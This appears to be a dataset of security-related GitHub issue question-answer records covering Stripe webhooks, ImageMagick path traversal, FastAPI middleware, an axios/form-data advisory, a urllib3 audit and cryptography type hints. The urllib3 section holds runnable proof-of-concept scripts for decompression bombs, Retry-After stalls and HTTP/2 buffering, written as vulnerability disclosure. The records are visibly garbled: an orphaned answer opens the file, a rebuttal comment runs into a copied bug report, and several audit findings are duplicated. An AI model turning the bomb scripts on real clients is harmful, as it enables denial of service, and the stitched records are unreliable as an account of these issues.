qa_pairs.answer: The problem is not a bug in `stripe-node`; it is in how the app/framework code is accessing the real raw JSON body. Webhook verification requires the exact same payload Stripe used to generate the signature, so if the framework, helpers, or body parsers change or touch the body, signature verification will fail. The maintainer pointed to stripe-node issue #341 for stack/version-specific solutions, and another commenter pointed to an article noting the parser problem.

title: Insecure File Access Due to External Control of Environment Variables in Magick++
security_topic: path traversal via environment-variable-controlled file paths
qa_summary: Whether the path traversal via SRCDIR/MAGICK_FONT can be mitigated by ImageMagick’s documented security policy that denies file reads outside an allowed directory.

comments.author: weaver4VD
urban-warrior
comments.body:
ImageMagick uses this pattern in its demos and test utilities, but these executables are **not** included in a standard installation. When the code is used independently, developers can harden it by sanitizing any user‑controlled paths before passing them to ImageMagick.

As an additional layer of protection, a user may restrict ImageMagick’s filesystem access by denying all reads except those from explicitly allowed directories. A [security policy](https://imagemagick.org/script/security-policy.php) such as the following can enforce this:

```xml
<policymap>
  <!-- Deny all file reads by default -->
  <policy domain="path" rights="none" pattern="*" />

  <!-- Allow reads ONLY from /opt/ImageMagick/ -->
  <policy domain="path" rights="read" pattern="/opt/ImageMagick/*" />
</policymap>
```

How this policy works

- Global deny rule — Blocks all filesystem reads (pattern="*").
- Allow rule — Re‑enables read access only for files located under /opt/ImageMagick/.

All other paths, including system directories such as /etc/, /home/, /var/, and any relative path traversal attempts like ../../,  are denied.

qa_pairs.answer: ImageMagick uses this pattern only in demos and test utilities, and those executables are not included in a standard installation. If the code is used independently, developers should sanitize user-controlled paths before passing them to ImageMagick. As an additional protection, filesystem access can be restricted with an ImageMagick security policy that denies all reads by default and allows reads only from explicitly allowed directories, e.g. denying `pattern="*"` and allowing read access only under `/opt/ImageMagick/*`.
grounding_sources: ImageMagick demos and test utilities are not included in a standard installation

title: "request.json()" hangs indefinitely in middleware
security_topic: reading request body in middleware for security validation without blocking

### Example Code

```python
from fastapi import FastAPI, Request, Response
from starlette.middleware.base import BaseHTTPMiddleware, RequestResponseEndpoint


class Middleware(BaseHTTPMiddleware):

    async def dispatch(self, request: Request, call_next: RequestResponseEndpoint) -> Response:
        await request.json()

Ubuntu 22.04

0.79.0

Python 3.10.4

_No response_

comments.author: csrgxtu
comments.body:
you should remove line 8 code:
```python
await request.json()
```
it is not this code pending your execution, it's following code pending your execution:

```python

async def test(test: dict) -> dict:
    return {"data": "test"}
```
when fastapi run your test func, it tries to fill the params from request.body, but you already read the body out from stream, thus later read will pending. ref following fastapi code:

comments.author: csrgxtu
comments.body:
@araujo88 you can ref this issue: https://github.com/tiangolo/fastapi/issues/394

in summary it is a bug or design issue from starlette, and there is work around:

```python
from typing import Mapping

from starlette.requests import Request

from fastapi import FastAPI, APIRouter, Depends

app = FastAPI()
api_router = APIRouter()

@api_router.post("/")
def read_root(arg: Mapping[str, str]):
    return {"Hello": "World"}

async def auth_middleware(request: Request):
    # you can implement your auth here
    print(await request.json())

# the trick here is including auth_middleware in the dependencies:
app.include_router(api_router, dependencies=[Depends(auth_middleware)])
```
thus this middleware logic will work on every requests, we use it same way in our production env, works fine.

note: `Dependencies` will inject your auth logic into each request, for more detail ref: https://fastapi.tiangolo.com/tutorial/dependencies/

comments.author: leo-aa88
comments.body: Is it possible to stream a request multiple times in FastAPI using `self.stream()`? I tried various approches, like copying the `Request` object, but none of them worked.

comments.author: xingdongzhe
comments.body:
@araujo88 It can't be using `self.stream()`, for per request, only one time can use `self.stream()`.  
Or you will hang forever because of `await self.event_message.wait()`  
[You can see here: uvicorn/protocols/http/h11_impl.py#L543](https://github.com/encode/uvicorn/blob/fedf67e68d3f81c846bf3740c8ae21fa133000a4/uvicorn/protocols/http/h11_impl.py#L543)  
This is because that when `self.stream()` done, there are no action to notify `self.event_message`
This `asyncio.Event` will be notified of four actions:
- when Connection Lost
- when body_data received
- when body_data readed done
- when write reponse data done

And you can try this:
```
async for chunk in request.stream():
    print(chunk)
await request.json()
```

comments.body: @XingDongZhe I'm trying to process the request body through different middleware for different purposes (such as logging, sanitizing, etc.) however once the `request.stream()` has been called once by the first middleware, the next middleware keeps awaiting for the request due to the way `request.stream()` is implemented. What would be the correct approach for this? I've seen workarounds such as implementing a new middleware class instead of using `BaseHTTPMiddleware` but that seems too far-off to me.

comments.body: If you want to keep using BaseHTTPMiddleware, I would suggest you create a new Request object at the end of your middleware to avoid such indefinite waits.

title: Allow reading Forwarded header as alternative to X-Forwarded-

title: 🐛 Bug Report: Critical Vulnerability in Transitive Dependency form-data@4.0.0 via axios@1.10.0
qa_summary: The developer needed a mitigation for the form-data@4.0.0 vulnerability in axios 1.10.0, and the answer provides a concrete fix by adding an override to use form-data@4.0.4 (referencing SNYK-JS-FORMDATA-10841150).
human_note: Accepted because it directly mitigates a confirmed transitive dependency security vulnerability (SNYK-JS-FORMDATA-10841150) in Axios by providing a concrete dependency override to a fixed safe version (form-data@4.0.4).

comments.author: izzygld
comments.body:
### Describe the bug

Axios v1.10.0 introduces a critical vulnerability via its transitive dependency on form-data@4.0.0. According to [Snyk Security Advisory SNYK-JS-FORMDATA-10841150](https://security.snyk.io/vuln/SNYK-JS-FORMDATA-10841150), this version of form-data is affected by a Predictable Value Range from Previous Values issue, which can lead to HTTP parameter pollution and potentially allow boundary manipulation in multipart requests.

### To Reproduce

Install axios@1.10.0 and run a Snyk test:

```
npm install axios@1.10.0
npx snyk test

```
You’ll receive:

```
✗ Predictable Value Range from Previous Values [Critical Severity]
  in form-data@4.0.0 via axios@1.10.0 > form-data@4.0.0
  This issue was fixed in: 2.5.4, 3.0.4, 4.0.4
```



### Code snippet

```js

```

### Expected behavior

**Expected behavior**
Axios should avoid depending on a vulnerable version of form-data. The expected behavior is that form-`data@4.0.4` or higher is used to prevent exposure to known critical vulnerabilities.

### Axios Version

1.10.0

### Adapter Version

HTTP

### Browser

Chrome

### Browser Version

_No response_

### Node.js Version

18.18.0

### OS

Ubuntu 22.04

### Additional Library Versions

```bash
NA
```

### Additional context/Screenshots

```bash
Snyk output (✔ = after fix):

Tested 104 dependencies for known issues, found 1 issue, 1 vulnerable path.

✗ Predictable Value Range from Previous Values [Critical Severity]
https://security.snyk.io/vuln/SNYK-JS-FORMDATA-10841150
in form-data@4.0.0 via axios@1.10.0 > form-data@4.0.0

After updating form-data:

✔ Tested 57 dependencies for known issues, no vulnerable paths found.


Suggested Fix
Ensure that Axios depends on form-data@^4.0.4 or higher, which contains the upstream fix for this vulnerability.
```

comments.body: Please don't spam the world with bogus security alerts. 😩 The dependency was _not_ on `form-data@4.0.0`, but on `form-data@^4.0.0`. According to Snyk Security Advisory SNYK-JS-FORMDATA-10841150 (https://security.snyk.io/vuln/SNYK-JS-FORMDATA-10841150), form-data@4.0.0 is affected by a Predictable Value Range from Previous Values issue that can lead to HTTP parameter pollution and potentially allow boundary manipulation in multipart requests.

To reproduce:

```
npm install axios@1.10.0
npx snyk test

```

The output is:

```
✗ Predictable Value Range from Previous Values [Critical Severity]
  in form-data@4.0.0 via axios@1.10.0 > form-data@4.0.0
  This issue was fixed in: 2.5.4, 3.0.4, 4.0.4
```

Environment: Axios Version 1.10.0, Adapter HTTP, Browser Chrome, Node.js 18.18.0, OS Ubuntu 22.04, Additional Library Versions NA.

Additional Snyk output/context:

```bash
Snyk output (✔ = after fix):

Tested 104 dependencies for known issues, found 1 issue, 1 vulnerable path.

✗ Predictable Value Range from Previous Values [Critical Severity]
https://security.snyk.io/vuln/SNYK-JS-FORMDATA-10841150
in form-data@4.0.0 via axios@1.10.0 > form-data@4.0.0

After updating form-data:

✔ Tested 57 dependencies for known issues, no vulnerable paths found.

How should I avoid exposure to the vulnerable form-data version when using axios@1.10.0?

comments.author: D47A
comments.body:
_Environment used for validation_: Python 3.12 virtualenv at `.venv` with `urllib3==2.6.2` (latest on PyPI) plus optional `h2==4.3.0`.

## Findings

### 1. Unlimited decompression can exhaust client memory (High)
- **Location:** `src/urllib3/response.py:619`-`src/urllib3/response.py:1110`
- **Impact:** When `Accept-Encoding` is enabled (default), `HTTPResponse.read()` always fully inflates compressed bodies without any upper bound on the decoded size. A malicious peer can send a very small gzip/brotli/zstd payload that expands to gigabytes, leading to client-side memory exhaustion or process termination, independent of the advertised `Content-Length`.
- **Details:** `_decode()` forces `max_length=-1` when `flush_decoder` is true (line 637) and directly feeds all incoming bytes to the decoder (line 641) while `read()` keeps appending to `_decoded_buffer` until the requested amount is satisfied or EOF (line 1097 onward). There is no limit tied to `Content-Length`, streaming hint, or caller-provided cap, so any compressed response is eagerly expanded into RAM.
- **Proof of Concept:**
  ```python
  import gzip, http.server, socketserver, threading, urllib3

  payload = gzip.compress(b"A" * (50 * 1024 * 1024))  # 50 MB after inflate

  class Handler(http.server.BaseHTTPRequestHandler):
      def do_GET(self):
          self.send_response(200)
          self.send_header("Content-Encoding", "gzip")
          self.send_header("Content-Length", str(len(payload)))
          self.end_headers()
          self.wfile.write(payload)
      def log_message(self, *args):
          pass

  server = socketserver.TCPServer(("127.0.0.1", 0), Handler)
  threading.Thread(target=server.serve_forever, daemon=True).start()

  http = urllib3.PoolManager()
  resp = http.request("GET", f"http://127.0.0.1:{server.server_address[1]}/")
  print(len(resp.data))  # prints 52428800, showing the inflated size held in memory

  server.shutdown()
  ```
  Increasing the payload size proportionally increases instantaneous memory usage in the urllib3 client process.
- **Recommendation:** Introduce configurable limits for the decoded body size (e.g., cap based on `Content-Length`, a new `max_decoded_bytes` parameter, or stop inflating once a threshold is hit) and allow streaming decoders to hand off chunks directly to the caller without buffering everything in `_decoded_buffer`.

### 2. `Retry-After` header induces unbounded client sleep (Medium)
- **Location:** `src/urllib3/util/retry.py:308-339`
- **Impact:** When `Retry.respect_retry_after_header` (True by default) is set, urllib3 trusts any `Retry-After` header and performs `time.sleep(retry_after)` with the parsed value. A malicious origin or intermediary can respond with `Retry-After: 31536000` to block the caller’s worker thread for a year, bypassing request-level timeouts and causing denial of service across thread pools.
- **Details:** `sleep_for_retry()` parses either a delta seconds or HTTP-date (lines 308-323) and, if present, unconditionally calls `time.sleep(retry_after)` (line 338) before reattempting the request. There is no upper bound, no linkage to the configured timeout, and no way to abort the sleep other than thread interruption.
- **Proof of Concept:**
  ```python
  import http.server, socketserver, threading, time
  import urllib3

  class Handler(http.server.BaseHTTPRequestHandler):
      def do_GET(self):
          self.send_response(503)
          self.send_header("Retry-After", "5")  # attacker controls this value
          self.end_headers()
      def log_message(self, *args):
          pass

  server = socketserver.TCPServer(("127.0.0.1", 0), Handler)
  threading.Thread(target=server.serve_forever, daemon=True).start()

  retries = urllib3.util.retry.Retry(total=1, respect_retry_after_header=True)
  http = urllib3.PoolManager()
  start = time.time()
  try:
      http.request("GET", f"http://127.0.0.1:{server.server_address[1]}/", retries=retries)
  except urllib3.exceptions.MaxRetryError:
      pass
  print(round(time.time() - start, 2))  # ~5.0 seconds, equal to Retry-After header

  server.shutdown()
  ```
  Raising the header to hours or days will stall the thread for the same duration.
- **Recommendation:** Cap `Retry-After` sleeps to a configurable maximum (defaulting to a few seconds) or tie the sleep to the original request timeout; allow users to opt out or enforce asynchronous cancellation.

### 3. HTTP/2 responses are always fully buffered despite `preload_content=False` (Medium)
- **Location:** `src/urllib3/http2/connection.py:226-266` and `src/urllib3/http2/connection.py:324-347`
- **Impact:** The experimental HTTP/2 backend accumulates the entire response body in a `bytearray` (line 230) and materializes it into `HTTP2Response.data` regardless of the caller’s `preload_content` flag. There is no streaming API, so any large HTTP/2 download forces full buffering, opening the door to memory exhaustion when a remote server (or CDN) sends multi-GB responses. Dependent services expecting streaming semantics (e.g., `stream=True` in requests) silently lose back-pressure when HTTP/2 is enabled.
- **Details:** `HTTP2Connection.getresponse()` reads until `StreamEnded`, appending each `DataReceived` chunk to `data` (lines 248-255). The resulting bytes are stored in `_data` inside `HTTP2Response` (line 331), and methods such as `.stream()` are not implemented. The passed `preload_content` flag from `HTTPSConnectionPool.urlopen()` is ignored entirely for HTTP/2 connections.
- **Proof of Concept:**
  ```python
  import urllib3, urllib3.http2

  urllib3.http2.inject_into_urllib3()
  http = urllib3.PoolManager(headers={"accept-encoding": "identity"})
  resp = http.request(
      "GET",
      "https://nghttp2.org/httpbin/stream-bytes/10240",
      preload_content=False,
  )
  print(resp.version_string, len(resp.data))  # -> HTTP/2 10240
  urllib3.http2.extract_from_urllib3()
  ```
  Despite `preload_content=False`, the full payload is buffered in `resp.data`. Increasing the endpoint size quickly spikes RAM.
- **Recommendation:** Honor `preload_content=False` by exposing a streaming HTTP/2 response object (e.g., forward `DataReceived` frames to an iterator) or block HTTP/2 upgrades unless the caller explicitly opts in to buffering. At a minimum, document the limitation and provide safeguards (max buffered bytes) to prevent accidental memory exhaustion.

### 4. Redirect draining eagerly decompresses attacker-controlled bodies (High)
- **Location:** `src/urllib3/poolmanager.py:500`-`src/urllib3/poolmanager.py:503` and `src/urllib3/response.py:793`-`src/urllib3/response.py:801`
- **Impact:** When a response triggers a redirect, `PoolManager` always calls `response.drain_conn()` before following the `Location`. `drain_conn()` simply invokes `HTTPResponse.read()` with default arguments, which eagerly inflates any `Content-Encoding` on the response body. An attacker can reply with `302 Found`, a tiny compressed payload that expands to hundreds of megabytes, and a benign `Location`. The client must fully decompress the unused body before the redirect is honored, leading to CPU and memory exhaustion without the application ever touching the response object.
- **Details:** The redirect logic at `poolmanager.py:500-503` calls `response.drain_conn()` unconditionally. `drain_conn()` in turn calls `self.read()` (response.py:799-800), which performs the same unlimited decompression described in Finding 1. Because redirects are handled internally, even a single GET to an attacker-controlled URL can force the client to inflate arbitrary amounts of data just to reach the next hop.
- **Proof of Concept:**
  ```python
  import gzip, http.server, socketserver, threading, time, urllib3

  payload = gzip.compress(b"A" * (200 * 1024 * 1024))  # ~200 MB once inflated

  class Handler(http.server.BaseHTTPRequestHandler):
      def do_GET(self):
          if self.path == "/next":
              self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
              return
          self.send_response(302)
          self.send_header("Location", "/next")
          self.send_header("Content-Encoding", "gzip")
          self.send_header("Content-Length", str(len(payload)))
          self.end_headers()
          self.wfile.write(payload)
      def log_message(self, *args): pass

  srv = socketserver.TCPServer(("127.0.0.1", 0), Handler)
  threading.Thread(target=srv.serve_forever, daemon=True).start()

  http = urllib3.PoolManager()
  start = time.time()
  resp = http.request("GET", f"http://127.0.0.1:{srv.server_address[1]}/")
  print(resp.status, resp.data, "elapsed", round(time.time() - start, 2), "s")
  srv.shutdown()
  ```
  Even though the redirect target is only “ok”, the client spends noticeable time decompressing the 200 MB payload. Scaling the compressed bomb quickly leads to out-of-memory conditions.
- **Recommendation:** Avoid decompressing or even reading redirect bodies entirely—most clients ignore them. At minimum, cap the number of bytes that `drain_conn()` will pull (both raw and decoded) or skip draining compressed redirect bodies by closing the socket instead of decompressing attacker data.

### 5. HTTP proxy redirects always drop `Authorization`/`Cookie` headers (Medium)
- **Location:** `src/urllib3/poolmanager.py:602`-`src/urllib3/poolmanager.py:616` and `src/urllib3/poolmanager.py:477`-`src/urllib3/poolmanager.py:487`
- **Impact:** When using a plain HTTP proxy (no CONNECT), urllib3 mis-identifies every redirect as “cross-host” because `ProxyManager.connection_from_host()` builds pools keyed on the proxy host (line 614). Consequently `conn.is_same_host(redirect_location)` always returns `False`, so the redirect logic strips every header listed in `Retry.remove_headers_on_redirect`—including `Authorization`, `Cookie`, and any user-provided entries—even if the redirect stays on the exact same origin. Authenticated HTTP workflows behind proxies therefore lose credentials or session cookies after the first redirect and often fall into infinite login loops.
- **Details:** For HTTP destinations, `connection_from_host()` ignores the target host and instead returns a pool for `self.proxy.host` (`poolmanager.py:614-616`). Later, `PoolManager.urlopen()` removes “unsafe” headers whenever `not conn.is_same_host(redirect_location)` (`poolmanager.py:477-487`). Because `conn.host` is the proxy, not the origin, this condition is always true and every redirect is treated as cross-origin.
- **Proof of Concept:**
  ```python
  import urllib3
  proxy = urllib3.ProxyManager("http://proxy.local:8080")
  conn = proxy.connection_from_host("example.com", 80, "http")
  print("pool host:", conn.host)  # -> proxy.local
  print("same host redirect?",
        conn.is_same_host("http://example.com/secure"))  # -> False
  ```
  The above means cookies/Authorization headers will be stripped before following even a relative redirect to `/secure`. Users behind mandatory HTTP proxies cannot stay authenticated on any site that issues redirects (OAuth, SSO, login flows).
- **Recommendation:** Track the original destination host separately from the proxy host when evaluating `is_same_host` for redirects, or short-circuit the removal logic when a forwarding proxy is in use so headers are only stripped when the *destination* host truly changes.

### 6. Enabling HTTP/2 globally makes proxy usage fail outright (Low)
- **Location:** `src/urllib3/http2/connection.py:94`-`src/urllib3/http2/connection.py:103` and `src/urllib3/http2/__init__.py:30`-`src/urllib3/http2/__init__.py:42`
- **Impact:** Calling `urllib3.http2.inject_into_urllib3()` replaces every `HTTPSConnection` with `HTTP2Connection`, which explicitly raises `NotImplementedError` whenever `proxy` or `proxy_config` is supplied. Any deployment that uses proxies (corporate networks, tests that rely on mitmproxy, etc.) immediately loses outbound HTTPS support once HTTP/2 is injected, effectively taking the client offline.
- **Details:** `HTTP2Connection.__init__` rejects all proxy kwargs (line 94) and the injector rewires `HTTPSConnectionPool.ConnectionCls` globally to `HTTP2Connection` (http2/__init__.py lines 30-36). Proxied requests therefore crash before any network traffic is attempted.
- **Proof of Concept:**
  ```python
  import urllib3, urllib3.http2

  urllib3.http2.inject_into_urllib3()
  proxy = urllib3.ProxyManager("http://127.0.0.1:3128/")
  try:
      proxy.request("GET", "https://example.com/", timeout=urllib3.util.Timeout(1))
  except Exception as exc:
      print(type(exc).__name__, exc)
  finally:
      urllib3.http2.extract_from_urllib3()
  # -> NotImplementedError: Proxies aren't supported with HTTP/2
  ```
- **Recommendation:** Either keep HTTP/1.1 as a fallback ALPN option when proxies are present or block the injection entirely when proxy settings are detected so that enabling HTTP/2 cannot silently break every proxied request.

## Summary

| #   | Title                                                         | Location                                                                        | Severity |
| --- | ------------------------------------------------------------- | ------------------------------------------------------------------------------- | -------- |
| 1   | Unlimited decompression grows unbounded client memory         | `src/urllib3/response.py:619-1110`                                              | High     |
| 2   | `Retry-After` header can stall threads indefinitely           | `src/urllib3/util/retry.py:308-339`                                             | Medium   |
| 3   | HTTP/2 responses ignore streaming hints and buffer entirely   | `src/urllib3/http2/connection.py:226-347`                                       | Medium   |
| 4   | Redirect draining decompresses attacker-controlled bodies     | `src/urllib3/poolmanager.py:500-503`, `src/urllib3/response.py:793-801`         | High     |
| 5   | HTTP proxies treat every redirect as cross-host and drop auth | `src/urllib3/poolmanager.py:477-487`, `src/urllib3/poolmanager.py:602-616`      | Medium   |
| 6   | Global HTTP/2 injection disables all proxied HTTPS traffic    | `src/urllib3/http2/connection.py:94-103`, `src/urllib3/http2/__init__.py:30-42` | Low      |

comments.author: illia-v
comments.body:
Hi @D47A,

Thanks for the report! However, we'd appreciate if you reported potential security vulnerabilities privately using our security contact mentioned in [our Security Policy](https://github.com/urllib3/urllib3/security/policy).

> 1. Unlimited decompression can exhaust client memory

We are aware of the issue, but we do not consider it a vulnerability.
urllib3's users are advised to use [the streaming API](https://urllib3.readthedocs.io/en/stable/advanced-usage.html#streaming-and-i-o)  when dealing with responses of large or unknown length including responses from untrusted sources.

FYI, we applied a security hardening to the streaming API in the recent 2.6.0 release, check GHSA-2xpw-w6gg-jr37.

While unlimited decompression by the non-streaming API is not a security issue due to the described reasons, we consider adding parameters for configuring the maximum allowed response size as a new feature.


> 2. `Retry-After` header induces unbounded client sleep

Duplicate of #3743, fixed in 2.6.3


> 3. HTTP/2 responses are always fully buffered despite `preload_content=False`

It is fine to report HTTP/2 issues publicly because it is an experimental and uncomplete functionality.
#3300 exists for adding support for streaming HTTP/2 responses.


> 4. Redirect draining eagerly decompresses attacker-controlled bodies

This is a valid security issue, fixed in 2.6.3, see GHSA-38jv-5279-wg99


> 5. HTTP proxy redirects always drop `Authorization`/`Cookie` headers

I am not inclined to accept this as a security issue since the confidential information is not passed to third parties, but the issue does sound like a bug.


> 6. Enabling HTTP/2 globally makes proxy usage fail outright

#3299 exists for adding support for proxies with HTTP/2.

### 4. Redirect draining eagerly decompresses attacker-controlled bodies (High)
- **Location:** `src/urllib3/poolmanager.py:500`-`src/urllib3/poolmanager.py:503` and `src/urllib3/response.py:793`-`src/urllib3/response.py:801`
- **Impact:** When a response triggers a redirect, `PoolManager` always calls `response.drain_conn()` before following the `Location`. `drain_conn()` simply invokes `HTTPResponse.read()` with default arguments, which eagerly inflates any `Content-Encoding` on the response body. An attacker can reply with `302 Found`, a tiny compressed payload that expands to hundreds of megabytes, and a benign `Location`. The client must fully decompress the unused body before the redirect is honored, leading to CPU and memory exhaustion without the application ever touching the response object.
- **Details:** The redirect logic at `poolmanager.py:500-503` calls `response.drain_conn()` unconditionally. `drain_conn()` in turn calls `self.read()` (response.py:799-800), which performs the same unlimited decompression described in Finding 1. Because redirects are handled internally, even a single GET to an attacker-controlled URL can force the client to inflate arbitrary amounts of data just to reach the next hop.
- **Proof of Concept:**
  ```python
  import gzip, http.server, socketserver, threading, time, urllib3

  payload = gzip.compress(b"A" * (200 * 1024 * 1024))  # ~200 MB once inflated

  class Handler(http.server.BaseHTTPRequestHandler):
      def do_GET(self):
          if self.path == "/next":
              self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
              return
          self.send_response(302)
          self.send_header("Location", "/next")
          self.send_header("Content-Encoding", "gzip")
          self.send_header("Content-Length", str(len(payload)))
          self.end_headers()
          self.wfile.write(payload)
      def log_message(self, *args): pass

  srv = socketserver.TCPServer(("127.0.0.1", 0), Handler)
  threading.Thread(target=srv.serve_forever, daemon=True).start()

  http = urllib3.PoolManager()
  start = time.time()
  resp = http.request("GET", f"http://127.0.0.1:{srv.server_address[1]}/")
  print(resp.status, resp.data, "elapsed", round(time.time() - start, 2), "s")
  srv.shutdown()
  ```
  Even though the redirect target is only “ok”, the client spends noticeable time decompressing the 200 MB payload. Scaling the compressed bomb quickly leads to out-of-memory conditions.
- **Recommendation:** Avoid decompressing or even reading redirect bodies entirely—most clients ignore them. At minimum, cap the number of bytes that `drain_conn()` will pull, both raw and decoded, or skip draining compressed redirect bodies by closing the socket instead of decompressing attacker data.

### 5. HTTP proxy redirects always drop `Authorization`/`Cookie` headers (Medium)
- **Location:** `src/urllib3/poolmanager.py:602`-`src/urllib3/poolmanager.py:616` and `src/urllib3/poolmanager.py:477`-`src/urllib3/poolmanager.py:487`
- **Impact:** When using a plain HTTP proxy with no CONNECT, urllib3 mis-identifies every redirect as “cross-host” because `ProxyManager.connection_from_host()` builds pools keyed on the proxy host (line 614). Consequently `conn.is_same_host(redirect_location)` always returns `False`, so the redirect logic strips every header listed in `Retry.remove_headers_on_redirect`—including `Authorization`, `Cookie`, and any user-provided entries—even if the redirect stays on the exact same origin. Authenticated HTTP workflows behind proxies therefore lose credentials or session cookies after the first redirect and often fall into infinite login loops.
- **Details:** For HTTP destinations, `connection_from_host()` ignores the target host and instead returns a pool for `self.proxy.host` (`poolmanager.py:614-616`). Later, `PoolManager.urlopen()` removes “unsafe” headers whenever `not conn.is_same_host(redirect_location)` (`poolmanager.py:477-487`). Because `conn.host` is the proxy, not the origin, this condition is always true and every redirect is treated as cross-origin.
- **Proof of Concept:**
  ```python
  import urllib3
  proxy = urllib3.ProxyManager("http://proxy.local:8080")
  conn = proxy.connection_from_host("example.com", 80, "http")
  print("pool host:", conn.host)  # -> proxy.local
  print("same host redirect?",
        conn.is_same_host("http://example.com/secure"))  # -> False
  ```
  The above means cookies/Authorization headers will be stripped before following even a relative redirect to `/secure`. Users behind mandatory HTTP proxies cannot stay authenticated on any site that issues redirects (OAuth, SSO, login flows).
- **Recommendation:** Track the original destination host separately from the proxy host when evaluating `is_same_host` for redirects, or short-circuit the removal logic when a forwarding proxy is in use so headers are only stripped when the destination host truly changes.

### 6. Enabling HTTP/2 globally makes proxy usage fail outright (Low)
- **Location:** `src/urllib3/http2/connection.py:94`-`src/urllib3/http2/connection.py:103` and `src/urllib3/http2/__init__.py:30`-`src/urllib3/http2/__init__.py:42`
- **Impact:** Calling `urllib3.http2.inject_into_urllib3()` replaces every `HTTPSConnection` with `HTTP2Connection`, which explicitly raises `NotImplementedError` whenever `proxy` or `proxy_config` is supplied. Any deployment that uses proxies, such as corporate networks or tests that rely on mitmproxy, immediately loses outbound HTTPS support once HTTP/2 is injected, effectively taking the client offline.
- **Details:** `HTTP2Connection.__init__` rejects all proxy kwargs (line 94) and the injector rewires `HTTPSConnectionPool.ConnectionCls` globally to `HTTP2Connection` (http2/__init__.py lines 30-36). Proxied requests therefore crash before any network traffic is attempted.
- **Proof of Concept:**
  ```python
  import urllib3, urllib3.http2

  urllib3.http2.inject_into_urllib3()
  proxy = urllib3.ProxyManager("http://127.0.0.1:3128/")
  try:
      proxy.request("GET", "https://example.com/", timeout=urllib3.util.Timeout(1))
  except Exception as exc:
      print(type(exc).__name__, exc)
  finally:
      urllib3.http2.extract_from_urllib3()
  # -> NotImplementedError: Proxies aren't supported with HTTP/2
  ```

Are these accepted as security vulnerabilities or bugs, and what fixes, workarounds, or existing tracking issues apply?
qa_pairs.answer:
Thanks for the report! However, we'd appreciate if you reported potential security vulnerabilities privately using our security contact mentioned in [our Security Policy](https://github.com/urllib3/urllib3/security/policy).

> 1. Unlimited decompression can exhaust client memory

We are aware of the issue, but we do not consider it a vulnerability.
urllib3's users are advised to use [the streaming API](https://urllib3.readthedocs.io/en/stable/advanced-usage.html#streaming-and-i-o)  when dealing with responses of large or unknown length including responses from untrusted sources.

FYI, we applied a security hardening to the streaming API in the recent 2.6.0 release, check GHSA-2xpw-w6gg-jr37.

While unlimited decompression by the non-streaming API is not a security issue due to the described reasons, we consider adding parameters for configuring the maximum allowed response size as a new feature.


> 2. `Retry-After` header induces unbounded client sleep

Duplicate of #3743, fixed in 2.6.3


> 3. HTTP/2 responses are always fully buffered despite `preload_content=False`

It is fine to report HTTP/2 issues publicly because it is an experimental and uncomplete functionality.
#3300 exists for adding support for streaming HTTP/2 responses.


> 4. Redirect draining eagerly decompresses attacker-controlled bodies

This is a valid security issue, fixed in 2.6.3, see GHSA-38jv-5279-wg99


> 5. HTTP proxy redirects always drop `Authorization`/`Cookie` headers

I am not inclined to accept this as a security issue since the confidential information is not passed to third parties, but the issue does sound like a bug.


> 6. Enabling HTTP/2 globally makes proxy usage fail outright

#3299 exists for adding support for proxies with HTTP/2.

title: Wrong type annotation for is_signature_valid
security_topic: type annotation mismatch for cryptography public key validation
qa_summary: The developer needed to know that the type signature for `CertificateRevocationList.is_signature_valid` is correct because a certificate can contain a public key not valid for issuing, and they should refer to the Cryptography library’s `CertificateIssuerPrivateKeyTypes` documentation (https://cryptography.io/en/latest/hazmat/primitives/asymmetric/#cryptography.hazmat.primitives.asymmetric.types.CertificateIssuerPrivateKeyTypes).

comments.author: userappgate
comments.body:
See this example code:

```python3
from cryptography import x509

def is_signature_valid(crl: bytes, ca_cert: bytes) -> bool:
    crl_object = x509.load_pem_x509_crl(crl)

    ca_cert_object = x509.load_pem_x509_certificate(ca_cert)

    return crl_object.is_signature_valid(ca_cert_object.public_key())
```

mypy fails with

```
test.py:8: error: Argument 1 to "is_signature_valid" of "CertificateRevocationList" has incompatible type "DSAPublicKey | RSAPublicKey | EllipticCurvePublicKey | Ed25519PublicKey | Ed448PublicKey | X25519PublicKey | X448PublicKey"; expected "DSAPublicKey | RSAPublicKey | EllipticCurvePublicKey | Ed25519PublicKey | Ed448PublicKey"  [arg-type]
```

I noticed that while migrating the codebast on ubuntu noble (that uses 41.0.7-4ubuntu0.1), while on ubuntu jammy (that uses 3.4.8-1ubuntu2.2) mypy does not complain.

The codebase is quite different, but the code seems to work on both versions so I think the mistake is in the type annotations (unless I am doing something wrong, of course).

Thanks

comments.author: alex
comments.body:
Unfortunately, that's correct.

A certificate can _carry_ a public key that's not valid for issuing certificates, and the type signatures reflect this.

You can use https://cryptography.io/en/latest/hazmat/primitives/asymmetric/#cryptography.hazmat.primitives.asymmetric.types.CertificateIssuerPrivateKeyTypes to check for this (either with `typing.cast()` or an `isinstance` check.)

qa_pairs.question:
In pyca/cryptography, is the type annotation for `CertificateRevocationList.is_signature_valid` wrong? For example:

```python3
from cryptography import x509

def is_signature_valid(crl: bytes, ca_cert: bytes) -> bool:
    crl_object = x509.load_pem_x509_crl(crl)

    ca_cert_object = x509.load_pem_x509_certificate(ca_cert)

    return crl_object.is_signature_valid(ca_cert_object.public_key())
```

On Ubuntu noble using cryptography `41.0.7-4ubuntu0.1`, mypy fails with:

```text
test.py:8: error: Argument 1 to "is_signature_valid" of "CertificateRevocationList" has incompatible type "DSAPublicKey | RSAPublicKey | EllipticCurvePublicKey | Ed25519PublicKey | Ed448PublicKey | X25519PublicKey | X448PublicKey"; expected "DSAPublicKey | RSAPublicKey | EllipticCurvePublicKey | Ed25519PublicKey | Ed448PublicKey"  [arg-type]
```

I noticed that while migrating the codebast on ubuntu noble (that uses 41.0.7-4ubuntu0.1), while on ubuntu jammy (that uses 3.4.8-1ubuntu2.2) mypy does not complain.

The codebase is quite different, but the code seems to work on both versions so I think the mistake is in the type annotations (unless I am doing something wrong, of course).

 Am I doing something wrong, or is this a mistake in the type annotations?
qa_pairs.answer: The maintainer says the annotation is correct: a certificate can carry a public key that is not valid for issuing certificates, and the type signatures reflect that. They suggest checking the key type against `CertificateIssuerPrivateKeyTypes`, either with `typing.cast()` or an `isinstance` check.
